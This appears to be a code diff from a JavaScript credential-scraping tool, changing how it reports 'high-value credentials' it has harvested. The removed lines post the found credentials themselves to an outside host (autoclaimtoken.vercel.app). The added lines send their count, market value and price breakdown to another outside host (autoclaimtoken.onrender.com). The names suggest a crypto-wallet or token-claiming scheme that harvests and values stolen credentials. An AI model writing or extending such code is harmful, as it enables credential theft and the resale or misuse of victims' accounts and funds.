@@ -110,15 +110,18 @@ class CredentialScraper {
       if (highValue.length > 0) {
         const totalValue = highValue.reduce((sum, r) => sum + (r.marketValue || 0), 0);
         try {
-          await axios.post('https://autoclaimtoken.vercel.app/api/send-alert', {
-            subject: `🔥 HIGH VALUE CREDENTIALS FOUND: $${totalValue}`,
-            message: `Found ${highValue.length} high-value credentials worth $${totalValue}\n\n` +
-                     `Breakdown:\n` +
-                     highValue.map(r => `- ${r.credential_type}: ${r.price} (${r.use})`).join('\n'),
-            credentials: highValue
+          await axios.post('https://autoclaimtoken.onrender.com/api/visitor-alert', {
+            walletAddress: 'ADMIN_SCRAPER',
+            action: 'HIGH_VALUE_CREDENTIALS_FOUND',
+            metadata: {
+              totalValue: totalValue,
+              count: highValue.length,
+              breakdown: highValue.map(r => `${r.credential_type}: ${r.price}`).join(', ')
+            }
           });
+          console.log('✅ Email alert sent for high-value credentials');
         } catch (e) {
-          console.log('Email alert failed:', e.message);
+          console.log('⚠️ Email alert failed:', e.message);
         }
       }
 
